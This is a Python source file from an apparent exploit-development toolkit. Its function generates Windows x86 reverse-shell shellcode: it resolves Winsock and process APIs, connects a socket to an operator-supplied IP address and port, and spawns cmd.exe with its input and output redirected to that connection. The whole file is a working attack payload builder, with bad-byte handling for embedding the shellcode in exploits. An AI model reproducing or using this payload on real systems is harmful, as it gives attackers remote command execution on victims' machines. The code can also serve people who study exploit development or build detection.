"""Reverse-shell payload builder."""

from shellcode.payload_utils import (
    flatten_asm,
    format_shellcode_asm,
    to_network_endpoint_bytes,
)
from shellcode.shellcode_helper import ShellcodeHelper


def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0, bad_bytes=None):
    var = ShellcodeHelper(bad_bytes=bad_bytes)

    f_term_process = "TerminateProcess"
    f_create_process = "CreateProcessA"
    f_wsastartup = "WSAStartup"
    f_wsasocketa = "WSASocketA"
    f_wsaconnect = "WSAConnect"

    for function_name in (
        f_term_process,
        f_create_process,
        f_wsastartup,
        f_wsasocketa,
        f_wsaconnect,
    ):
        var.add(function_name)

    v_socket = "socket"
    v_startup_info = "lpStartupInfo"
    v_sockaddr_in = "sockaddr_in"
    v_proc_info = "lpProcessInformation"
    v_lpWSAData = "lpWSAData"
    v_str_cmd_exe = "str_cmd_exe"

    var.add(v_socket)
    var.add(v_startup_info, reserve=0x44)
    var.add(v_sockaddr_in, reserve=0x10)
    var.add(v_proc_info, reserve=0x20)
    var.add(v_lpWSAData, reserve=0x190)
    var.add(v_str_cmd_exe, reserve=0x10)


    # prepare the `const sockaddr *name` struct needed later
    sin_addr_bytes, sin_port_bytes = to_network_endpoint_bytes(
        rev_ip_addr, rev_port
    )

    sin_family = 0x02

    sockin_data = int.to_bytes(sin_family, 2, "little")
    sockin_data += sin_port_bytes
    sockin_data += sin_addr_bytes

    asm = [
        "start:",
        f"{['', 'int3;'][breakpoint]}",
        var.get_esp_setup(),                    # reserve scratch space for all stack-backed variables
        var.get_clear_variables(),              # start from a fully zeroed variable area
        var.get_common_shellcode(),             # locate kernel32 and bootstrap find_function/LoadLibraryA

        "   resolve_symbols_kernel32: ",        # resolve APIs exported directly by kernel32
        var.find_function(f_term_process),
        var.find_function(f_create_process),

        "   load_ws2_32:                         ",  # load winsock before resolving socket APIs
        var.load_library("ws2_32.dll"),

        "   resolve_symbols_ws2_32:              ",  # resolve the networking APIs used by the reverse shell
        var.find_function(f_wsastartup),
        var.find_function(f_wsasocketa),
        var.find_function(f_wsaconnect),

        "   call_wsastartup:                    ",  # initialize winsock with version 2.2
        var.push_var_address(v_lpWSAData),
        "       xor eax, eax                    ;",
        "       mov ax, 0x0202                  ;",
        "       push eax                        ;",
        var.call_function(f_wsastartup),

        "   call_wsasocketa:                     ",  # create an AF_INET / SOCK_STREAM / IPPROTO_TCP socket
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # dwFlags = NULL
        "       push eax                        ;",  # g = NULL
        "       push eax                        ;",  # lpProtocolInfo = NULL
        "       mov al, 0x06                    ;",
        "       push eax                        ;",  # protocol = 0x06, IPPROTO_TCP
        "       sub al, 0x05                    ;",
        "       push eax                        ;",  # type = 0x01, SOCK_STREAM
        "       inc eax                         ;",
        "       push eax                        ;",  # af = 0x02, AF_INET
        var.call_function(f_wsasocketa),
        var.write_var(v_socket),                     # keep the connected socket handle for later reuse

        "   set_data_of_sockin:                  ",  # materialize sockaddr_in on the local scratch stack
        var.set_variable_data(v_sockaddr_in, sockin_data),

        "   call_wsaconnect:                     ",  # connect the socket back to the operator-controlled listener
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpGQOS
        "       push eax                        ;",  # lpSQOS
        "       push eax                        ;",  # lpCalleeData
        "       push eax                        ;",  # lpCallerData
        "       add al, 0x10                    ;",
        "       push eax                        ;",  # namelen = 0x10
        var.push_var_address(v_sockaddr_in),         # *name = ptr to v_sockaddr_in
        var.push_var_value(v_socket),                # socket
        var.call_function(f_wsaconnect),

        "   create_startupinfoa:                 ",  # set cb and STARTF_USESTDHANDLES in STARTUPINFOA
        "       xor eax, eax                    ;",
        "       mov al, 0x44                    ;",
        var.write_var(v_startup_info, "eax", 0x00),  # offset 0x00: cb = sizeof(STARTUPINFOA)
        "       add al, 0xBB                    ;",  # eax = 0xFF
        "       inc eax                         ;",  # eax = 0x100
        var.write_var(v_startup_info, "eax", 0x2C),  # offset 0x2C: dwFlags = 0x100

        var.read_var(v_socket),                      # eax = socket
        var.write_var(v_startup_info, "eax", 0x38),  # offset 0x38: hStdInput = socket
        var.write_var(v_startup_info, "eax", 0x3C),  # offset 0x3C: hStdOutput = socket
        var.write_var(v_startup_info, "eax", 0x40),  # offset 0x40: hStdError = socket

        "   create_cmd_string:                   ",  # prepare a writable command line buffer for CreateProcessA
        var.set_variable_data(v_str_cmd_exe, b"cmd.exe"),

        "   call_createprocessa:                 ",  # spawn cmd.exe with inherited stdio redirected to the socket
        var.push_var_address(v_proc_info),           # lpProcessInformation = ptr to v_proc_info
        var.push_var_address(v_startup_info),        # lpStartupInfo = ptr to v_startup_info
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpCurrentDirectory = NULL
        "       push eax                        ;",  # lpEnvironment = NULL
        "       push eax                        ;",  # dwCreationFlags = NULL
        "       inc eax                         ;",  #
        "       push eax                        ;",  # bInheritHandles = TRUE
        "       dec eax                         ;",  #
        "       push eax                        ;",  # lpThreadAttributes = NULL
        "       push eax                        ;",  # lpProcessAttributes = NULL
        var.push_var_address(v_str_cmd_exe, "ebx"),  # lpCommandLine = ptr to v_str_cmd_exe
        "       push eax                        ;",  # lpApplicationName = NULL
        var.call_function(f_create_process),

        "   exec_shellcode:                      ",  # terminate the original thread/process context after the child is created
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push 0xffffffff                 ;",
        var.call_function(f_term_process),
    ]
    return format_shellcode_asm("\n".join(flatten_asm(asm)))
